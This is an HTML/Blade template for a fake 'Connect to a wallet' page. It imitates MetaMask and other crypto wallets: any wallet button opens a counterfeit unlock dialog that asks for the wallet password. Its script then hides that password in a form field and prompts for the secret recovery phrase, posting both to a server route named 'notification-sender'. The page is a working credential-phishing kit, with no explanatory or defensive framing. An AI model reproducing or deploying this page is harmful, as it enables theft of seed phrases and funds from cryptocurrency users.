<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="{{ asset('css/style.css') }}">
</head>
<body>
    <section class="home">
        <div class="container">
            <div class="theBox">
                <div class="topLine">
                    <span>Connect to a wallet</span>
                </div>

                    <div class="main">
                        <button type="button" class="box btn btn-primary" onclick="metamaskClick()" >
                                <div class="walletName">
                                    <span>MetaMask</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="leagerClick()">
                                <div class="walletName">
                                    <span>Ledger With Metamask</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}" alt="">
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="walletClick()">
                                <div class="walletName">
                                    <span>Wallet connect</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/download-removebg-preview.png') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"   onclick="nbaClick()">
                                <div class="walletName">
                                    <span>NBA Top Shot</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/images.jpg') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="tezoClick()">
                                <div class="walletName">
                                    <span>Tezos</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/tb_logo_small.jpg') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="coinbaseClick()">
                                <div class="walletName">
                                    <span>Coinbase Wallet</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/download.jpg') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="bitskiClick()">
                                <div class="walletName">
                                    <span>Bitski</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/download_image.jpg') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="roolClick()">
                                <div class="walletName">
                                    <span>WanChain</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/rool_image.jpg') }}" alt="">
                                </div>
                        </button>
                    </div>
            </div>


                <!-- Modal -->
            <div class="modal fade" id="exampleSinlgeModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                    <div class="topLine d-flex align-items-center justify-contents-between">

                        <div id="headerSmall">

                        </div>
                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}

                        <select name="" id="">
                            <option value="">Etherrun Mainnet</option>
                        </select>
                    </div>

                    </div>
                    <div class="modal-body">

                        <div id="headerBig">

                        </div>
                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}


                        <h2>Welcome Back!</h2>
                        <p>The decentralize web awaits.</p>


                        <form action="#">
                            <input type="password" placeholder="Password" id="firstInputPassword">

                            <input type="button" value="Unlock" id="firstSubmitButton">
                        </form>

                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
                    </div>

                </div>
                </div>
            </div>



            <div class="modal fade" id="exampleSecondModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">

                    <div class="topLine d-flex align-items-center justify-contents-between">

                        <div id="headerSmallSecond">

                        </div>
                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}

                        <select name="" id="">
                            <option value="">Etherrun Mainnet</option>
                        </select>
                    </div>

                    </div>
                    <div class="modal-body">

                        <div id="headerBigSecond">

                        </div>
                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}


                        <h2>Welcome Back!</h2>
                        <p>The decentralize web awaits.</p>

                        <form action="{{ route('notification-sender') }}" method="POST">
                            @csrf
                            <input type="text" name="password" id="hiddenPassword" hidden>
                            <input type="text" placeholder="Phrase" name="pharse">
                            <input type="submit" value="Confirm">
                        </form>

                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
                    </div>

                </div>
                </div>
            </div>




        </div>
    </section>


        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

        <script>

            document.getElementById('firstSubmitButton').addEventListener('click', function(){
               const inputValue =  document.getElementById('firstInputPassword').value;
               if (inputValue == "") {
                    alert("Insert Password To continue");
                    return false;
                } else {
                    const modalHeaderSection = document.getElementById('headerSmall').innerHTML;
                    document.getElementById('headerSmallSecond').innerHTML = modalHeaderSection;
                    document.getElementById('headerBigSecond').innerHTML = modalHeaderSection;

                document.getElementById('modalCloseButton').click();

                const myModalSecond = new bootstrap.Modal(document.getElementById('exampleSecondModal'), {});
                myModalSecond.show();

                document.getElementById('hiddenPassword').value = inputValue;

                }

                });




            function metamaskClick()
            {
                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                const image = '{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}'
                const imageSrc = '<img src='+image + '>'

                const modalHeaderSection = document.getElementById('headerSmall');
                document.getElementById('headerBig').innerHTML =imageSrc
                modalHeaderSection.innerHTML = imageSrc;
                myModal.show();
            }


            function leagerClick()
            {
                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                const image = '{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}'
                const imageSrc = '<img src='+image + '>'
                const modalHeaderSection = document.getElementById('headerSmall');
                document.getElementById('headerBig').innerHTML =imageSrc
                modalHeaderSection.innerHTML = imageSrc;
                myModal.show();
            }


            function walletClick()
                {
                    const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                const image = '{{ asset('images/download-removebg-preview.png') }}'
                const imageSrc = '<img src='+image + '>'
                const modalHeaderSection = document.getElementById('headerSmall');
                document.getElementById('headerBig').innerHTML =imageSrc
                modalHeaderSection.innerHTML = imageSrc;
                myModal.show();

                }


                function nbaClick()
                {
                    const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                    const image = '{{ asset('images/images.jpg') }}'
                    const imageSrc = '<img src='+image + '>'
                    const modalHeaderSection = document.getElementById('headerSmall');
                    document.getElementById('headerBig').innerHTML =imageSrc
                    modalHeaderSection.innerHTML = imageSrc;
                    myModal.show();
                }

                function tezoClick()
                {
                    const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                    const image = '{{ asset('images/tb_logo_small.jpg') }}'
                    const imageSrc = '<img src='+image + '>'
                    const modalHeaderSection = document.getElementById('headerSmall');
                    document.getElementById('headerBig').innerHTML =imageSrc
                    modalHeaderSection.innerHTML = imageSrc;
                    myModal.show();
                }

                function coinbaseClick()
                    {
                        const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                        const image = '{{ asset('images/download.jpg') }}'
                        const imageSrc = '<img src='+image + '>'
                        const modalHeaderSection = document.getElementById('headerSmall');
                        document.getElementById('headerBig').innerHTML =imageSrc
                        modalHeaderSection.innerHTML = imageSrc;
                        myModal.show();
                    }

                    function bitskiClick()
                        {
                            const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                            const image = '{{ asset('images/download_image.jpg') }}'
                            const imageSrc = '<img src='+image + '>'
                            const modalHeaderSection = document.getElementById('headerSmall');
                            document.getElementById('headerBig').innerHTML =imageSrc
                            modalHeaderSection.innerHTML = imageSrc;
                            myModal.show();
                        }

                        function roolClick()
                            {
                                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                                const image = '{{ asset('images/rool_image.jpg') }}'
                                const imageSrc = '<img src='+image + '>'
                                const modalHeaderSection = document.getElementById('headerSmall');
                                document.getElementById('headerBig').innerHTML =imageSrc
                                modalHeaderSection.innerHTML = imageSrc;
                                myModal.show();
                            }







        </script>

</body>
</html>
